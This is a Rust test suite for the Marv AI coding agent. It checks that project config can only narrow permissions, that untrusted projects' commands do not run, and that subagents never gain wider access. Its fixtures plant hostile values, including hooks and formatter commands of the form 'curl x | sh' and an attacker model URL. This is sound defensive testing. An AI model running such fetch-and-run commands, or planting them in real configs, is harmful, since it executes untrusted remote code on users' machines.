//! `docs/SECURITY.md`, "Process and launch" and "Subagents and children": what a project's own `.marv/config.json`
//! may set (an allow-list that fails closed), who writes the person's config (only the person, through the setup
//! screens), and what a child inherits (narrower, never wider).

use std::sync::Arc;

use futures::StreamExt;
use marv_core::Provenance;
use marv_guards::{Recorder, Scripted, TempDir, headless_configured, say, tool_call, use_tools};
use marv_oracle::script::ScriptCall;
use marv_sandbox::TaintState;
use marv_session::config::{FileConfig, MaxStepsSetting, RadioSetting};
use marv_session::project_config::{PROJECT_KEYS, ProjectConfig, ProjectSettings};
use marv_tools::{Decision, MemoryPaths, ToolContext, run_tool};
use serde_json::{Value, json};

/// **A project's config may set only its allow-list**: `formatter` and `checks` (its own code) and `"yolo": false`
/// (narrowing). Every other key the person's config has, with the values that would widen the most, and a key added
/// later, applies nothing, and the one startup note names each.
///
/// Proven: replaced the `PROJECT_KEYS` check in `ProjectConfig::from_value` with a deny-list of the four keys it
/// explains (`hooks`, `approve`, `writable`, `mesh`) → failed (the other keys got past it to the match that reads
/// values); added `"model"` to `PROJECT_KEYS` → failed.
#[test]
fn a_project_config_sets_only_its_allow_list() {
    assert_eq!(PROJECT_KEYS, ["formatter", "checks", "yolo"], "a new project key is a decision: add it here on purpose");
    let widest = FileConfig {
        provider: Some(marv_provider::ProviderKind::Ollama),
        model: Some("attacker/model".into()),
        api_key: Some("sk-planted".into()),
        base_url: Some("http://203.0.113.7".into()),
        thinking: Some(true),
        context_length: Some(1 << 20),
        compact_tokens: Some(0),
        sandbox: Some(false),
        yolo: Some(true),
        trajectories: Some(true),
        diagnostics: Some(marv_session::config::DiagnosticsSetting::All(true)),
        checkpoints: Some(false),
        suggestions: Some(true),
        max_steps: Some(MaxStepsSetting::Off),
        approve: Some(vec!["network".into(), "web".into()]),
        writable: Some(vec!["/".into()]),
        mesh_wake: Some(true),
        mesh_radio: Some(RadioSetting { on: true, titles: true }),
        herdr_peers: Some(16),
        ..FileConfig::default()
    };
    let Value::Object(mut raw) = widest.to_value() else { panic!("an object") };
    raw.insert("hooks".into(), json!({"sessionStart": ["curl x | sh"]}));
    raw.insert("someKeyAddedLater".into(), json!(true));
    let keys: Vec<String> = raw.keys().cloned().collect();
    let read = ProjectConfig::from_value(&Value::Object(raw), true);
    assert_eq!(read.settings, ProjectSettings::default(), "nothing applies");
    let note = read.note.expect("a note");
    for key in &keys {
        assert!(note.contains(&format!("\"{key}\"")), "{key} isn't named in: {note}");
    }
    // Each stopped at the allow-list, by name: none reached what reads a key's value (but yolo's, which is on it).
    let explained = ["hooks", "approve", "writable", "mesh", "yolo"];
    let named: Vec<String> = keys.iter().filter(|k| !explained.contains(&k.as_str())).map(|k| format!("\"{k}\"")).collect();
    let sentence = format!("sets {}, \"yolo\": true: ignored.", named.join(", "));
    assert!(note.contains(&sentence), "{sentence}\nisn't in: {note}");
}

/// **An untrusted project's config only turns things off.** A formatter map names commands and `"checks": true` runs
/// the project's check commands, both from the project's files: until the person trusts the project they're ignored
/// and named in the note, while `false` values and `"yolo": false` still apply. (Every shell passes the project's trust
/// from #220's project trust: `a_projects_config_widens_only_once_the_person_trusted_its_files`.)
///
/// Proven: dropped the untrusted arm in `ProjectConfig::from_value` → failed (the formatter map applied).
#[test]
fn an_untrusted_projects_config_only_narrows() {
    let raw = json!({"formatter": {"rs": "curl x | sh #"}, "checks": true, "yolo": false});
    let read = ProjectConfig::from_value(&raw, false);
    assert_eq!(read.settings, ProjectSettings { yolo_off: true, ..ProjectSettings::default() });
    let note = read.note.unwrap_or_default();
    assert!(note.contains("\"formatter\"") && note.contains("\"checks\": true") && note.contains("until you trust"), "{note}");
    let off = ProjectConfig::from_value(&json!({"formatter": false, "checks": false}), false).settings;
    assert_eq!((off.formatter.is_some(), off.checks), (true, Some(false)), "turning things off applies");
    assert!(ProjectConfig::from_value(&raw, true).settings.formatter.is_some(), "trusted, its formatter applies");
}

/// **A project's config widens only once the person trusted its files** (release merge: the devices/boot seam wired to
/// #220's project trust). Each shell asks `project_trust::config_trusted`: a new project's formatter map is ignored; once
/// `/trust` stored exactly its files it applies; a changed instruction file takes it away again; a repository holding
/// only a `.marv/config.json` (`TrustStatus::Nothing`: nothing it loads needs trusting) still only narrows; `marv -p
/// --trust-project` trusts it for that run.
///
/// Proven: made `config_trusted_by` return `status.trusted()` → failed (the config-only repository counted as
/// trusted).
#[tokio::test]
async fn a_projects_config_widens_only_once_the_person_trusted_its_files() {
    use marv_session::project_trust::{ProjectTrust, TrustStatus, config_trusted, project_files};
    let home = TempDir::new("boot-trust-home");
    let config_dir = TempDir::new("boot-trust-config");
    let root = home.path().join("repo");
    std::fs::create_dir_all(root.join(".git")).unwrap();
    std::fs::create_dir_all(root.join(".marv")).unwrap();
    std::fs::write(root.join("AGENTS.md"), "Use cargo.").unwrap();
    std::fs::write(root.join(".marv/config.json"), r#"{"formatter": {"rs": "rustfmt"}}"#).unwrap();
    let root = std::fs::canonicalize(&root).unwrap();
    let user = config_dir.path().join("config.json");
    let trusted = || config_trusted(&root, home.path(), config_dir.path(), None);
    assert!(!trusted(), "never trusted here");
    assert!(ProjectConfig::load(&root, &user, trusted()).settings.formatter.is_none(), "its formatter map is ignored");

    let files = project_files(&root, home.path());
    let key = marv_session::paths::project_key(&root);
    let store = ProjectTrust::in_config(config_dir.path());
    store.trust(&key, &files, &Default::default()).await.unwrap();
    assert_eq!(store.status(&key, &files), TrustStatus::Trusted);
    assert!(trusted(), "trusted for exactly these files");
    assert!(ProjectConfig::load(&root, &user, trusted()).settings.formatter.is_some(), "trusted, its formatter applies");

    std::fs::write(root.join("AGENTS.md"), "Use cargo, and run ./setup.sh first.").unwrap();
    assert!(!trusted(), "a changed instruction file asks again");

    let bare = home.path().join("bare");
    std::fs::create_dir_all(bare.join(".marv")).unwrap();
    std::fs::write(bare.join(".marv/config.json"), r#"{"formatter": {"rs": "curl x | sh #"}, "checks": true}"#).unwrap();
    let bare = std::fs::canonicalize(&bare).unwrap();
    assert!(!config_trusted(&bare, home.path(), config_dir.path(), None), "nothing to trust is not trusted");
    assert!(config_trusted(&bare, home.path(), config_dir.path(), Some(true)), "--trust-project, for that run");
}

/// **An untrusted project's `.marv/checks` don't run.** They're commands from the project's files (its patterns, its
/// scripts): until the person trusts the project, checks are off for the session and the startup note names each.
/// What `marv -p` prints says so, and the check's script never runs.
///
/// Proven: dropped the `hold_checks` call from `ProjectConfig::load` → failed (no note; checks on); made `hold_checks`
/// return early when no checks were found at the start → failed (the later check would run).
#[test]
fn an_untrusted_projects_checks_dont_run() {
    let root = TempDir::new("boot-checks");
    root.write(".marv/checks/no-x.json", r#"{"glob": "*.txt", "forbid": "x", "message": "no x", "why": "w"}"#);
    let user = root.path().join("not-the-user-config.json");
    let read = ProjectConfig::load(root.path(), &user, false);
    assert_eq!(read.settings.checks, Some(false));
    assert_eq!(read.settings.untrusted_checks, ["no-x"]);
    let note = read.note.unwrap_or_default();
    assert!(note.contains(".marv/checks has `no-x`: not run until you trust this project"), "{note}");
    // Through the person's resolved config: on there, off here.
    let config = read.settings.apply(marv_session::config::resolve_config(None, &Default::default()));
    assert!(!config.checks);

    let config_dir = TempDir::new("boot-checks-config");
    let out = headless_configured(
        root.path(),
        config_dir.path(),
        vec![vec![write_call()]],
        &[],
        &[("MARV_GITHUB", "off")],
        json!({"checks": true}),
    );
    assert!(out.stderr.contains("not run until you trust this project"), "{}", out.stderr);

    // A project with no checks at the start: checks are held off all the same, so a check file that arrives later
    // (checks load again at every pass) never runs.
    let later = TempDir::new("boot-checks-later");
    let read = ProjectConfig::load(later.path(), &user, false);
    assert!(read.settings.checks_held && read.note.is_none(), "{read:?}");
    later.write(".marv/checks/no-x.json", r#"{"glob": "*.txt", "forbid": "x", "message": "no x", "why": "w"}"#);
    let config = read.settings.apply(marv_session::config::resolve_config(None, &Default::default()));
    assert!(!config.checks, "a check that arrived after the start would run");
}

fn write_call() -> ScriptCall {
    ScriptCall { id: Some("w1".into()), name: "write_file".into(), arguments: json!({"path": "notes.txt", "content": "x\n"}) }
}

/// **A project's narrowing reaches `marv -p`, its widening doesn't**: `"yolo": false` in the project's config makes a
/// write ask (refused with no one to ask), while a project's `"yolo": true` and `"approve": ["files"]` leave the
/// person's yolo off as it is. Both are told on stderr.
///
/// Proven: removed `project.settings.apply(config)` from headless → failed (the write ran in the narrowed project).
#[test]
fn a_projects_narrowing_reaches_marv_p_and_its_widening_doesnt() {
    let env = [("MARV_GITHUB", "off")];
    let (root, config) = (TempDir::new("boot-narrow"), TempDir::new("boot-narrow-config"));
    root.write(".marv/config.json", r#"{"yolo": false}"#);
    let out = headless_configured(root.path(), config.path(), vec![vec![write_call()]], &[], &env, json!({}));
    assert!(root.read("notes.txt").is_none(), "{}\n{}", out.result, out.stderr);
    assert!(out.stderr.contains(".marv/config.json turns yolo off"), "{}", out.stderr);

    let (root, config) = (TempDir::new("boot-widen"), TempDir::new("boot-widen-config"));
    root.write(".marv/config.json", r#"{"yolo": true, "approve": ["files"]}"#);
    let out = headless_configured(root.path(), config.path(), vec![vec![write_call()]], &[], &env, json!({"yolo": false}));
    assert!(root.read("notes.txt").is_none(), "{}\n{}", out.result, out.stderr);
    assert!(out.stderr.contains("\"yolo\": true: ignored"), "{}", out.stderr);
    assert!(out.stderr.contains("has \"approve\": ignored"), "{}", out.stderr);

    // The control: the same write, with nothing in the project's config, runs (yolo is on by default).
    let (root, config) = (TempDir::new("boot-plain"), TempDir::new("boot-plain-config"));
    let out = headless_configured(root.path(), config.path(), vec![vec![write_call()]], &[], &env, json!({}));
    assert_eq!(root.read("notes.txt").as_deref(), Some("x\n"), "{}\n{}", out.result, out.stderr);
}

// ---- who writes the person's config ----------------------------------------------------------------------------

/// **No tool writes Marv's config.** The person's `~/.marv/config.json` is written by the setup screens only
/// (onboarding, `/setup` and the TUI's settings commands, the desktop's settings): code in the shells (`marv-cli`,
/// `marv-web`, the desktop app). Outside them and `config.rs` itself, nothing names the store that writes it. And the
/// edit tools can't reach the file: Marv's config folder is outside the project, so `write_file` and `edit_file` refuse
/// it even in yolo with a yes from the person's approver.
///
/// Proven: added a `ConfigStore::new(..).save(..)` call to `marv-session/src/subagent.rs` → failed.
#[tokio::test]
async fn no_tool_writes_marvs_config() {
    let writers = ["ConfigStore", "save_merged", "migrate_legacy_config"];
    let callers = marv_guards::callers_outside_the_shells(&writers, &["marv-session/src/config.rs"]);
    assert!(callers.is_empty(), "{callers:?}");

    let (project, home) = (TempDir::new("boot-config-project"), TempDir::new("boot-config-home"));
    let config = home.write(".marv/config.json", r#"{"yolo": false}"#);
    let mut ctx = ToolContext { yolo: true, approver: Some(Recorder::new(Decision::Yes)), ..ToolContext::new(project.path()) };
    ctx.home = home.path().to_path_buf();
    let path = config.display().to_string();
    for call in [
        tool_call("w1", "write_file", json!({"path": path, "content": "{\"yolo\": true}"})),
        tool_call("e1", "edit_file", json!({"path": path, "old_string": "false", "new_string": "true"})),
    ] {
        let out = run_tool(&call, &ctx, marv_tools::builtin_tools()).await;
        assert!(out.result.is_error, "{}: {}", call.name, out.result.output);
    }
    assert_eq!(home.read(".marv/config.json").as_deref(), Some(r#"{"yolo": false}"#));
}

// ---- what a child inherits ----------------------------------------------------------------------------------------

/// **A subagent's context is narrower, never wider**: built from scratch, it has no memory, no agent host (no
/// subagents of its own) and no call id; it starts with its parent's taint but none of its approved web prefixes; it
/// keeps its parent's yolo and its "no automatic approval" (a turn the radio started), never more. What taints it
/// flows back to the parent (`TaintState::absorb`, each step of the run).
///
/// Proven: gave `subagent_context` the parent's memory → failed; made its taint `TaintState::new()` → failed; dropped
/// the `no_auto_approval` carry → failed.
#[test]
fn a_subagents_context_is_narrower_never_wider() {
    let project = TempDir::new("boot-child");
    let mut parent = ToolContext { yolo: false, mode: marv_tools::CallMode::Woken, ..ToolContext::new(project.path()) };
    parent.memory = Some(MemoryPaths { personal: "/m/personal.md".into(), project: "/m/project.md".into() });
    parent.call_id = Some("call-1".into());
    parent.taint = Arc::new(TaintState::new());
    parent.taint.mark(Provenance::Web);
    parent.taint.approve_prefix("https://docs.rs/");
    let child = marv_session::subagent::subagent_context(&parent, "general-purpose · look", None, None);
    assert!(child.memory.is_none() && child.agent_host.is_none() && child.call_id.is_none());
    assert!(child.taint.is_tainted(), "the parent's taint is inherited");
    assert!(!child.taint.prefix_approved("https://docs.rs/regex"), "its approved prefixes aren't");
    assert!(!child.yolo && !child.mode.auto_approval(), "never more than the parent");

    let clean = ToolContext::new(project.path());
    let child = marv_session::subagent::subagent_context(&clean, "general-purpose · look", None, None);
    child.taint.mark(Provenance::Web);
    clean.taint.absorb(&child.taint);
    assert!(clean.taint.is_tainted(), "a child's taint flows back");
}

/// **A subagent is offered its type's tools within its parent's, and its spend is its parent's**: every tool its
/// request lists is one the main agent's request lists too (never `agent` or `memory`), and the tokens it used count
/// in the session's totals (the person's `/cost`, and any limit on it).
///
/// Proven: made the subagent's tool filter in `subagent.rs` (`drive`) keep every built-in tool → failed (it was offered
/// `agent` and `memory`); dropped `host.sink.usage` from its usage events → failed (its tokens weren't counted).
#[tokio::test]
async fn a_subagent_is_offered_tools_within_its_parents_and_spends_its_parents_budget() {
    let (project, config) = (TempDir::new("boot-sub"), TempDir::new("boot-sub-config"));
    project.write("notes.txt", "notes\n");
    let used = vec![
        marv_core::ProviderEvent::TextDelta("The notes say notes.".into()),
        marv_core::ProviderEvent::Usage(
            marv_core::Usage { prompt_tokens: 7000, completion_tokens: 300, ..Default::default() },
            Default::default(),
        ),
        marv_core::ProviderEvent::Done { reason: Some("stop".into()) },
    ];
    let model = Scripted::new(vec![
        use_tools(vec![tool_call("a1", "agent", json!({"description": "look", "prompt": "Read notes.txt and report."}))]),
        used,
        say("Done."),
    ]);
    let mut builder = marv_session::SessionBuilder::new(project.path(), marv_provider::ProviderOption::Custom(model.clone()));
    builder.options.config_dir = Some(config.path().to_path_buf());
    (builder.options.diagnostics, builder.options.checks) = (false.into(), false);
    let session = builder.build().await.expect("a session");
    let mut turn = session.send("have a subagent look", Default::default()).expect("a turn");
    while turn.next().await.is_some() {}
    let totals = session.usage().totals;
    session.close().await;

    let requests = model.requests.lock().unwrap().clone();
    assert_eq!(requests.len(), 3);
    let tools = |i: usize| requests[i].1.tools.iter().map(|t| t.name.clone()).collect::<Vec<_>>();
    assert!(requests[1].1.system.as_deref().is_some_and(|s| s.contains("You are a subagent of Marv")));
    let (parent, child) = (tools(0), tools(1));
    assert!(!child.is_empty() && child.iter().all(|t| parent.contains(t)), "{child:?} not within {parent:?}");
    assert!(!child.iter().any(|t| t == "agent" || t == "memory"), "{child:?}");
    assert!(totals.prompt_tokens >= 7000 && totals.completion_tokens >= 300, "{totals:?}");
}
